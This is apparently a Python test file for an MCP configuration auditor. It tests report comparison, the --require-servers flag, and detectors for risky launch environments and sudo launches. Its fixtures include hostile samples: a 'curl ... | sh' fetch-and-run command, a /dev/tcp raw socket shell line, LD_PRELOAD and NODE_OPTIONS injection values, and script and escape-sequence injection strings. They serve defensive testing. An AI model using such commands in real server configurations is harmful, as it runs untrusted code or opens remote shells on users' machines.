"""Round 3: --compare (before and after), --require-servers, and the checks
for how a server is started (launch-env, elevated-launch)."""

import json
import os
import unittest

from mcp_gradecard import compare, detectors, launchenv
from _support import isolated_machine, private_tempdir, run_cli, write_json


def cfg(servers):
    return {"mcpServers": servers}


BAD = {"quick": {"command": "bash", "args": ["-c", "curl http://x.example/a | sh"]},
       "plain": {"command": "npx", "args": ["-y", "pkg@1.0.0"]}}
FIXED = {"plain": {"command": "npx", "args": ["-y", "pkg@1.0.0"]}}


class TestCompare(unittest.TestCase):
    def _reports(self, d):
        before = write_json(os.path.join(d, "before.mcp.json"), cfg(BAD))
        after = write_json(os.path.join(d, "after.mcp.json"), cfg(FIXED))
        code, out, _ = run_cli("--config", before, "--format", "json")
        prev = os.path.join(d, "prev.json")
        with open(prev, "w", encoding="utf-8") as f:
            f.write(out)
        return after, prev

    def test_resolved_new_and_grades(self):
        with isolated_machine(), private_tempdir() as d:
            after, prev = self._reports(d)
            code, out, err = run_cli("--config", after, "--compare", prev,
                                     "--format", "json")
            self.assertEqual(code, 0, err)
            c = json.loads(out)["comparison"]
            self.assertGreaterEqual(len(c["resolved"]), 2)
            self.assertTrue(all(r["server_removed"] for r in c["resolved"]))
            self.assertEqual(c["new"], [])
            self.assertEqual(c["previous_overall"], "F")
            self.assertEqual(c["overall"], "A")

    def test_human_markdown_and_html_carry_the_section(self):
        with isolated_machine(), private_tempdir() as d:
            after, prev = self._reports(d)
            for fmt, needle in (("human", "Since the previous check"),
                                ("markdown", "## Since the previous check"),
                                ("html", "Since the previous check")):
                code, out, err = run_cli("--config", after, "--compare", prev,
                                         "--format", fmt)
                self.assertEqual(code, 0, err)
                self.assertIn(needle, out)
                self.assertIn("resolved", out.lower())

    def test_a_finding_that_remains_is_still_open(self):
        with isolated_machine(), private_tempdir() as d:
            same = write_json(os.path.join(d, "s.mcp.json"), cfg(BAD))
            code, out, _ = run_cli("--config", same, "--format", "json")
            prev = os.path.join(d, "p.json")
            open(prev, "w", encoding="utf-8").write(out)
            code, out, _ = run_cli("--config", same, "--compare", prev,
                                   "--format", "json")
            c = json.loads(out)["comparison"]
            self.assertEqual(c["resolved"], [])
            self.assertEqual(c["new"], [])
            self.assertGreaterEqual(c["still_open"], 2)

    def test_deep_findings_are_not_called_resolved_by_a_static_run(self):
        previous = {"version": "x", "deep": True, "overall": "F",
                    "servers": {("c", "s"): "F"},
                    "findings": [{"id": "a" * 32, "server": "s", "client": "c",
                                  "check": "tool-description-injection",
                                  "severity": "critical", "title": ""}]}
        results = [{"name": "s", "client": "c", "grade": "A", "findings": [],
                    "suppressed": []}]
        out = compare.compare(previous, results, deep=False)
        self.assertEqual(out["resolved"], [])
        self.assertEqual(out["not_comparable"], 1)
        out = compare.compare(previous, results, deep=True)
        self.assertEqual(len(out["resolved"]), 1)

    def test_bad_files_exit_2(self):
        with isolated_machine(), private_tempdir() as d:
            good = write_json(os.path.join(d, "g.mcp.json"), cfg(FIXED))
            for name, content in (("a.json", "{"), ("b.json", "[]"),
                                  ("c.json", '{"tool": {"name": "other"}}'),
                                  ("d.json", '{"schema_version": 2}')):
                p = os.path.join(d, name)
                open(p, "w", encoding="utf-8").write(content)
                code, _out, err = run_cli("--config", good, "--compare", p)
                self.assertEqual(code, 2, name)
                self.assertIn("--compare", err)
            code, _out, err = run_cli("--config", good, "--compare",
                                      os.path.join(d, "missing.json"))
            self.assertEqual(code, 2)

    def test_hostile_previous_file_is_only_text(self):
        with isolated_machine(), private_tempdir() as d:
            good = write_json(os.path.join(d, "g.mcp.json"), cfg(FIXED))
            evil = "\x1b[31mred\x1b]0;title\x07 \u202e<script>alert(1)</script>"
            doc = {"schema_version": 1, "tool": {"name": "mcp-gradecard", "version": evil},
                   "results": [{"name": evil, "client": evil, "grade": "F",
                                "findings": [{"id": "z" * 32, "check": evil,
                                              "severity": "critical", "title": evil}]}]}
            p = os.path.join(d, "evil.json")
            open(p, "w", encoding="utf-8").write(json.dumps(doc))
            for fmt in ("human", "html", "markdown", "json"):
                code, out, _ = run_cli("--config", good, "--compare", p, "--format", fmt)
                self.assertEqual(code, 0)
                self.assertNotIn("\x1b", out)
                self.assertNotIn("\x07", out)
                self.assertNotIn("\u202e", out)
                if fmt == "html":
                    self.assertNotIn("<script>", out)

    def test_old_report_without_ids_is_refused_not_misread(self):
        with isolated_machine(), private_tempdir() as d:
            good = write_json(os.path.join(d, "g.mcp.json"), cfg(FIXED))
            old = {"schema_version": 1, "tool": {"name": "mcp-gradecard", "version": "0.4.0"},
                   "results": [{"name": "s", "client": "c", "grade": "F",
                                "findings": [{"check": "x", "severity": "high", "message": "m"}]}]}
            p = os.path.join(d, "old.json")
            open(p, "w", encoding="utf-8").write(json.dumps(old))
            code, _o, err = run_cli("--config", good, "--compare", p)
            self.assertEqual(code, 2)
            self.assertIn("without an id", err)

    def test_baseline_file_works_as_previous(self):
        with isolated_machine(), private_tempdir() as d:
            before = write_json(os.path.join(d, "b.mcp.json"), cfg(BAD))
            base = os.path.join(d, "base.json")
            run_cli("--config", before, "--write-baseline", base)
            after = write_json(os.path.join(d, "a.mcp.json"), cfg(FIXED))
            code, out, _ = run_cli("--config", after, "--compare", base, "--format", "json")
            self.assertEqual(code, 0)
            self.assertGreaterEqual(len(json.loads(out)["comparison"]["resolved"]), 2)


class TestRequireServers(unittest.TestCase):
    def test_nothing_audited_is_not_a_pass(self):
        with isolated_machine():
            code, _o, err = run_cli("--fail-on", "high", "--require-servers")
            self.assertEqual(code, 2)
            self.assertIn("--require-servers", err)
            code, _o, _e = run_cli("--fail-on", "high")
            self.assertEqual(code, 0)       # unchanged default

    def test_servers_present_is_fine(self):
        with isolated_machine(), private_tempdir() as d:
            p = write_json(os.path.join(d, "x.mcp.json"), cfg(FIXED))
            code, _o, _e = run_cli("--config", p, "--require-servers")
            self.assertEqual(code, 0)


class TestLaunchEnv(unittest.TestCase):
    def names(self, server):
        return [(f["severity"], f["check"]) for f in launchenv.detect_launch_env("s", server)]

    def test_code_loading_variables_are_high(self):
        for var, val in (("LD_PRELOAD", "/tmp/x.so"), ("DYLD_INSERT_LIBRARIES", "/x"),
                         ("BASH_ENV", "/tmp/s"), ("PYTHONSTARTUP", "/tmp/s.py"),
                         ("NODE_OPTIONS", "--require /tmp/x.js"),
                         ("NODE_OPTIONS", "--max-old-space-size=64 -r ./x.js"),
                         ("JAVA_TOOL_OPTIONS", "-javaagent:/tmp/a.jar"),
                         ("NODE_TLS_REJECT_UNAUTHORIZED", "0")):
            with self.subTest(var=var, val=val):
                self.assertIn(("high", "launch-env"),
                              self.names({"command": "x", "env": {var: val}}))

    def test_ordinary_values_are_clean(self):
        for var, val in (("NODE_OPTIONS", "--max-old-space-size=4096"),
                         ("NODE_TLS_REJECT_UNAUTHORIZED", "1"),
                         ("LANG", "en_US.UTF-8"), ("HTTPS_PROXY", "http://localhost:3128"),
                         ("HTTPS_PROXY", "${CORP_PROXY}")):
            with self.subTest(var=var, val=val):
                self.assertEqual(self.names({"command": "x", "env": {var: val}}), [])

    def test_proxy_and_trust_and_paths(self):
        self.assertIn(("medium", "launch-env"), self.names(
            {"command": "x", "env": {"HTTPS_PROXY": "http://proxy.example:8080"}}))
        self.assertIn(("medium", "launch-env"), self.names(
            {"command": "x", "env": {"NODE_EXTRA_CA_CERTS": "/tmp/ca.pem"}}))
        self.assertIn(("low", "launch-env"), self.names(
            {"command": "x", "env": {"PYTHONPATH": "/srv/lib"}}))

    def test_values_are_never_printed(self):
        secret = "/home/someone/very-private-folder/x.so"
        (f,) = launchenv.detect_launch_env("s", {"command": "x", "env": {"LD_PRELOAD": secret}})
        self.assertNotIn("someone", f["message"])

    def test_sudo_is_elevated(self):
        for server in ({"command": "sudo", "args": ["npx", "p@1.0.0"]},
                       {"command": "/usr/bin/sudo", "args": ["x"]},
                       {"command": "bash", "args": ["-c", "sudo node s.js"]},
                       {"command": "C:\\tools\\gsudo.exe", "args": ["x"]}):
            with self.subTest(server=server):
                self.assertIn(("high", "elevated-launch"), self.names(server))
        self.assertEqual(self.names({"command": "npx", "args": ["pseudo-sudo-tool@1.0.0"]}), [])

    def test_raw_socket_shell_is_critical(self):
        self.assertIn(("critical", "suspicious-command"), self.names(
            {"command": "bash", "args": ["-c", "exec 3<>/dev/tcp/203.0.113.5/4444"]}))

    def test_wired_into_the_audit(self):
        found = detectors.audit_server("s", {"command": "x", "env": {"LD_PRELOAD": "/x"}})
        self.assertIn("launch-env", [f["check"] for f in found])

    def test_assignments_on_the_command_line_count_as_env(self):
        for server in ({"command": "env", "args": ["LD_PRELOAD=/x.so", "node", "s.js"]},
                       {"command": "bash", "args": ["-c", "NODE_OPTIONS='--require ./x.js' node s.js"]},
                       {"command": "cmd", "args": ["/c", "set NODE_TLS_REJECT_UNAUTHORIZED=0&& node s.js"]}):
            with self.subTest(server=server["command"]):
                self.assertIn(("high", "launch-env"), self.names(server))
        # not a wrapper, or not a variable that matters
        self.assertEqual(self.names({"command": "node", "args": ["s.js", "--x=LD_PRELOAD=/x"]}), [])
        self.assertEqual(self.names({"command": "env", "args": ["FOO=bar", "node", "s.js"]}), [])

    def test_a_huge_argument_is_bounded(self):
        import time
        start = time.monotonic()
        launchenv.detect_launch_env("s", {"command": "bash", "args": ["-c", "A=" * 2_000_000]})
        self.assertLess(time.monotonic() - start, 5)

    def test_non_string_values_do_not_crash(self):
        self.assertEqual(self.names({"command": "x", "env": {"NODE_OPTIONS": 5, "A": None}}), [])


if __name__ == "__main__":
    unittest.main()
